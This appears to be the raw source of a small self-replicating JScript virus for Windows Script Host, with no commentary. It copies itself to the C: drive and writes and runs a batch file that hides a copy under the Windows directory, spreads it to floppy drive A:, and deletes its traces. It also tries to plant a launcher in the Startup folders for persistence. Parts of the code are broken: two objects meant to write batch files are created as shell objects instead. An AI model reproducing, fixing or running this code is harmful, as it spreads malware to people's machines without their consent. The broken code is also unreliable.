var fso=WScript.CreateObject("Scripting.FileSystemObject")
var MySf=fso.OpenTextFile(WScript.ScriptFullName,1)
var MySC=MySf.ReadAll()
var WSHShell = WScript.CreateObject("WScript.Shell");
MySf.Close()
MyS=fso.CreateTextFile("C:\viruz.js");
MyS.WriteLine(MySC);
MyS.Close();

var wsh = WScript.CreateObject("WScript.Shell");
dosfile=fso.CreateTextFile("C:\dosfile.bat");
dosfile.WriteLine("@echo off");
dosfile.WriteLine("cd %windir%");
dosfile.WriteLine("md ųų");
dosfile.WriteLine("cd ųų");
dosfile.WriteLine("copy C:\viruz.js viruz.js");
dosfile.WriteLine("command /f /c copy C:\viruz.js A:\");
dosfile.WriteLine("del C:\viruz.js");
dosfile.WriteLine("del %0");
dosfile.Close();
wsh.Run("C:\dosfile.bat");

var openvir= WScript.CreateObject("WScript.Shell");
openvir.writeline ("@echo off");
openvir.writeline ("cd %windir%");
openvir.writeline ("cd ųų");
openvir.writeline ("cscript viruz.js");
openvir.Close();

var copyov= WScript.CreateObject("WScript.Shell");
copyov.writeline ("@echo off");
copyov.writeline ("copy C:\openvir.bat %windir%\Startm~1\Programs\StartUp\winst.bat");
copyov.Writeline ("copy C:\openvir.bat %windir%\startm~1\progra~1\autost~1\winst.bat");
copyov.Writeline ("del C:\openvir.bat");
copyov.Writeline ("del %0");
copyov.Close();
wsh.run ("C:\copyov.bat");
